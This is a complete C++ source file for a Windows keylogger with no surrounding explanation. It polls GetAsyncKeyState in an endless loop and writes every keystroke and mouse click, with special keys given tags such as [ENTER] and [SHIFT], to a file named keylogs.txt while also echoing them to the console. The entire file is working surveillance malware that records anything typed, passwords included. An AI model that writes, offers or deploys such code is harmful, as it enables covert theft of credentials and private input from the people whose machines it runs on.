#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void WriteToLog(LPCSTR text)
{
    ofstream logfile;
    logfile.open("keylogs.txt", fstream::app);
    logfile << text;
    logfile.close();
}

bool KeyIsListed(int iKey)
{
    switch(iKey)
    {
        case VK_SPACE:
            cout << " ";
            WriteToLog(" ");
            break;

        case VK_RETURN:
            cout << " [ENTER] \n";
            WriteToLog(" [ENTER] \n");
            break;

        case VK_SHIFT:
            cout << " [SHIFT] ";
            WriteToLog(" [SHIFT] ");
            break;

        case VK_BACK:
            cout << "\b";
            WriteToLog("\b");
            break;
        
        case VK_RBUTTON:
            cout << " [RCLICK] ";
            WriteToLog(" [RCLICK] ");
            break;

        case VK_LBUTTON:
            cout << " [LCLICK] ";
            WriteToLog(" [LCLICK] ");
            break;

        case VK_LEFT:
            cout << " [LEFTARR] ";
            WriteToLog(" [LEFTARR] ");
            break;

        case VK_UP:
            cout << " [UPARR] ";
            WriteToLog(" [UPARR] ");
            break;

        case VK_RIGHT:
            cout << " [RIGHTARR] ";
            WriteToLog(" [RIGHTARR] ");
            break;

        case VK_DOWN:
            cout << " [DOWNARR] ";
            WriteToLog(" [DOWNARR] ");
            break;
        
        case VK_ESCAPE:
            cout << " [ESC] ";
            WriteToLog(" [ESC] ");
            break;
        
        case VK_TAB:
            cout << " [TAB] ";
            WriteToLog(" [TAB] ");
            break;
        
        case VK_INSERT:
            cout << " [INS] ";
            WriteToLog(" [INS] ");
            break;

        case VK_NUMLOCK:
            cout << " [NUMLK] ";
            WriteToLog(" [NUMLK] ");
            break;
        
        case VK_NUMPAD1:
            cout << "1";
            WriteToLog("1");
            break;

        case VK_NUMPAD2:
            cout << "2";
            WriteToLog("2");
            break;

        case VK_NUMPAD3:
            cout << "3";
            WriteToLog("3");
            break;

        case VK_NUMPAD4:
            cout << "4";
            WriteToLog("4");
            break;

        case VK_NUMPAD5:
            cout << "5";
            WriteToLog("5");
            break;

        case VK_NUMPAD6:
            cout << "6";
            WriteToLog("6");
            break;

        case VK_NUMPAD7:
            cout << "7";
            WriteToLog("7");
            break;

        case VK_NUMPAD8:
            cout << "8";
            WriteToLog("8");
            break;

        case VK_NUMPAD9:
            cout << "9";
            WriteToLog("9");
            break;
        
        case VK_OEM_PERIOD:
            cout << ".";
            WriteToLog(".");
            break;

        default: 
            return false;
    }
}

int main()
{
    char key;
    while (TRUE)
    {
        Sleep(10);
        for (key = 8; key <= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                 if (KeyIsListed(key) == FALSE)
                 {
                     cout << key;
                     ofstream logfile;
                     logfile.open("keylogs.txt", fstream::app);
                     logfile << key;
                     logfile.close();
                 }
            }
        }
    }

    return 0;
}